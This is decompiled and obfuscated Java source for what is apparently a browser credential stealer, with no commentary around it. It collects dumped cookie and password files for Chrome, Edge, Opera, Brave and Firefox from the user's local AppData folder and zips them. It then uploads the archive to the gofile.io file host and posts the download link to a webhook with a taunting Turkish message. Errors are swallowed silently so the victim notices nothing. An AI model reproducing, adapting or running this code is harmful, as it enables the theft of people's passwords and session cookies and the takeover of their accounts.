package 0.0.0.0;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Request.Builder;

public class 8 {
   private static final String 0 = "https://store2.gofile.io/uploadFile";
   private static final String 1 = "cnstl.zip";
   private static final List<String> 2 = Arrays.asList("cookies.txt", "cookies1.txt", "cookies2.txt", "cookies3.txt", "cookies4.txt", "cookies5.txt", "cookies6.txt", "cookies7.txt", "cookies8.txt", "cookies9.txt", "cookies10.txt", "cookies11.txt", "cookies12.txt", "cookies13.txt", "cookies14.txt", "cookies15.txt", "cookies16.txt", "cookies17.txt", "cookies18.txt", "cookies19.txt", "cookies20.txt", "cookies21.txt", "cookies22.txt", "cookies23.txt", "cookies24.txt", "cookies25.txt", "cookies26.txt", "cookies27.txt", "cookies28.txt", "cookies29.txt", "cookies30.txt", "edgecookies.txt", "operacookies.txt", "operagxcookies.txt", "bravecookies.txt", "password.txt", "password1.txt", "password2.txt", "password3.txt", "password4.txt", "password5.txt", "password6.txt", "password7.txt", "password8.txt", "password9.txt", "password10.txt", "password11.txt", "password12.txt", "password13.txt", "password14.txt", "password15.txt", "password16.txt", "password17.txt", "password18.txt", "password19.txt", "password20.txt", "password21.txt", "password22.txt", "password23.txt", "password24.txt", "password25.txt", "password26.txt", "password27.txt", "password28.txt", "password29.txt", "operas.txt", "ekstra.zip", "password30.txt", "fireps.txt", "fireck.txt", "edgepass.txt", "operapass.txt", "operagxpass.txt", "bravepass.txt");

   public static void main(String[] args) {
      String localAppDataPath = System.getenv("LOCALAPPDATA");
      String microsoftFolderPath = localAppDataPath + "\\Microsoft";
      File zipFile = new File(microsoftFolderPath, "cnstl.zip");

      try {
         0(microsoftFolderPath, zipFile);
         if (zipFile.exists()) {
            Thread.sleep(2000L);
            String downloadLink = 0(zipFile);

            try {
               if (downloadLink != null) {
                  Thread.sleep(2000L);
                  0("cnstl.zip", downloadLink, 0j.2);
               }
            } catch (Exception var5) {
               throw var5;
            }
         }
      } catch (Exception var6) {
      }

   }

   private static void _/* $FF was: 0*/(String basePath, File outputZip) {
      try {
         ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(outputZip));
         Throwable var3 = null;

         try {
            Iterator var4 = 2.iterator();

            while(var4.hasNext()) {
               String fileName = (String)var4.next();
               File file = new File(basePath, fileName);
               if (file.exists()) {
                  try {
                     FileInputStream fis = new FileInputStream(file);
                     Throwable var8 = null;
                     boolean var42 = false;

                     try {
                        var42 = true;
                        ZipEntry zipEntry = new ZipEntry(fileName);
                        zos.putNextEntry(zipEntry);
                        byte[] buffer = new byte[4096];

                        while(true) {
                           int bytesRead;
                           int var10000 = bytesRead = fis.read(buffer);

                           try {
                              if (var10000 != -1) {
                                 zos.write(buffer, 0, bytesRead);
                                 continue;
                              }
                           } catch (Throwable var48) {
                              throw var48;
                           }

                           zos.closeEntry();
                           var42 = false;
                           break;
                        }
                     } catch (Throwable var49) {
                        var8 = var49;
                        throw var49;
                     } finally {
                        if (var42) {
                           label297: {
                              label296: {
                                 try {
                                    if (fis == null) {
                                       break label297;
                                    }

                                    if (var8 != null) {
                                       break label296;
                                    }
                                 } catch (Throwable var47) {
                                    throw var47;
                                 }

                                 fis.close();
                                 break label297;
                              }

                              try {
                                 fis.close();
                              } catch (Throwable var44) {
                                 var8.addSuppressed(var44);
                              }
                           }

                        }
                     }

                     if (fis != null) {
                        if (var8 != null) {
                           try {
                              fis.close();
                           } catch (Throwable var45) {
                              var8.addSuppressed(var45);
                           }
                        } else {
                           fis.close();
                        }
                     }
                  } catch (IOException var51) {
                  }
               }
            }
         } catch (Throwable var52) {
            var3 = var52;
            throw var52;
         } finally {
            label287: {
               label286: {
                  try {
                     if (zos == null) {
                        break label287;
                     }

                     if (var3 == null) {
                        break label286;
                     }
                  } catch (Throwable var46) {
                     throw var46;
                  }

                  try {
                     zos.close();
                  } catch (Throwable var43) {
                     var3.addSuppressed(var43);
                  }
                  break label287;
               }

               zos.close();
            }

         }
      } catch (IOException var54) {
      }

   }

   public static String _/* $FF was: 0*/(File fileToUpload) {
      try {
         String boundary = "*****" + Long.toHexString(System.currentTimeMillis()) + "*****";
         URL url = new URL("https://store2.gofile.io/uploadFile");
         HttpURLConnection connection = (HttpURLConnection)url.openConnection();
         connection.setRequestMethod("POST");
         connection.setDoOutput(true);
         connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
         OutputStream outputStream = connection.getOutputStream();
         Throwable var5 = null;

         try {
            PrintWriter writer = new PrintWriter(new OutputStreamWriter(outputStream, "UTF-8"), true);
            Throwable var7 = null;
            boolean var89 = false;

            try {
               var89 = true;
               writer.append("--").append(boundary).append("\r\n");
               writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(fileToUpload.getName()).append("\"\r\n");
               writer.append("Content-Type: application/zip\r\n");
               writer.append("\r\n").flush();
               FileInputStream fileInputStream = new FileInputStream(fileToUpload);
               Throwable var9 = null;
               boolean var111 = false;

               try {
                  var111 = true;
                  byte[] buffer = new byte[4096];

                  while(true) {
                     int bytesRead;
                     int var10000 = bytesRead = fileInputStream.read(buffer);

                     try {
                        if (var10000 != -1) {
                           outputStream.write(buffer, 0, bytesRead);
                           continue;
                        }
                     } catch (Throwable var125) {
                        throw var125;
                     }

                     outputStream.flush();
                     var111 = false;
                     break;
                  }
               } catch (Throwable var126) {
                  var9 = var126;
                  throw var126;
               } finally {
                  if (var111) {
                     label920: {
                        label919: {
                           try {
                              if (fileInputStream == null) {
                                 break label920;
                              }

                              if (var9 == null) {
                                 break label919;
                              }
                           } catch (Throwable var124) {
                              throw var124;
                           }

                           try {
                              fileInputStream.close();
                           } catch (Throwable var115) {
                              var9.addSuppressed(var115);
                           }
                           break label920;
                        }

                        fileInputStream.close();
                     }

                  }
               }

               if (fileInputStream != null) {
                  if (var9 != null) {
                     try {
                        fileInputStream.close();
                     } catch (Throwable var117) {
                        var9.addSuppressed(var117);
                     }
                  } else {
                     fileInputStream.close();
                  }
               }

               writer.append("\r\n").flush();
               writer.append("--").append(boundary).append("--").append("\r\n").flush();
               var89 = false;
            } catch (Throwable var128) {
               var7 = var128;
               throw var128;
            } finally {
               if (var89) {
                  label910: {
                     label909: {
                        try {
                           if (writer == null) {
                              break label910;
                           }

                           if (var7 == null) {
                              break label909;
                           }
                        } catch (Throwable var123) {
                           throw var123;
                        }

                        try {
                           writer.close();
                        } catch (Throwable var114) {
                           var7.addSuppressed(var114);
                        }
                        break label910;
                     }

                     writer.close();
                  }

               }
            }

            if (writer != null) {
               if (var7 != null) {
                  try {
                     writer.close();
                  } catch (Throwable var116) {
                     var7.addSuppressed(var116);
                  }
               } else {
                  writer.close();
               }
            }
         } catch (Throwable var130) {
            var5 = var130;
            throw var130;
         } finally {
            label900: {
               label899: {
                  try {
                     if (outputStream == null) {
                        break label900;
                     }

                     if (var5 != null) {
                        break label899;
                     }
                  } catch (Throwable var122) {
                     throw var122;
                  }

                  outputStream.close();
                  break label900;
               }

               try {
                  outputStream.close();
               } catch (Throwable var113) {
                  var5.addSuppressed(var113);
               }
            }

         }

         if (connection.getResponseCode() == 200) {
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            var5 = null;

            try {
               StringBuilder responseBuilder = new StringBuilder();

               while(true) {
                  String line;
                  String var139 = line = reader.readLine();

                  try {
                     if (var139 != null) {
                        responseBuilder.append(line);
                        continue;
                     }
                  } catch (Throwable var119) {
                     throw var119;
                  }

                  JsonObject jsonResponse = JsonParser.parseString(responseBuilder.toString()).getAsJsonObject();
                  JsonObject dataObject = jsonResponse.getAsJsonObject("data");
                  String var138 = dataObject.get("downloadPage").getAsString();
                  return var138;
               }
            } catch (Throwable var120) {
               var5 = var120;
               throw var120;
            } finally {
               label874: {
                  label873: {
                     try {
                        if (reader == null) {
                           break label874;
                        }

                        if (var5 == null) {
                           break label873;
                        }
                     } catch (Throwable var118) {
                        throw var118;
                     }

                     try {
                        reader.close();
                     } catch (Throwable var112) {
                        var5.addSuppressed(var112);
                     }
                     break label874;
                  }

                  reader.close();
               }

            }
         }

         connection.disconnect();
      } catch (Exception var132) {
      }

      return null;
   }

   public static void _/* $FF was: 0*/(String fileName, String downloadLink, String webhookUrl) {
      try {
         OkHttpClient client = new OkHttpClient();
         JsonObject embed = new JsonObject();
         embed.addProperty("title", fileName);
         embed.addProperty("url", downloadLink);
         embed.addProperty("description", "hey yarrakin oglunun dosyalarini cektim");
         JsonObject payload = new JsonObject();
         payload.add("embeds", JsonParser.parseString("[" + embed.toString() + "]").getAsJsonArray());
         RequestBody body = RequestBody.create(payload.toString(), MediaType.parse("application/json"));
         Request request = (new Builder()).url(webhookUrl).post(body).build();
         client.newCall(request).execute().close();
      } catch (Exception var8) {
      }

   }
}
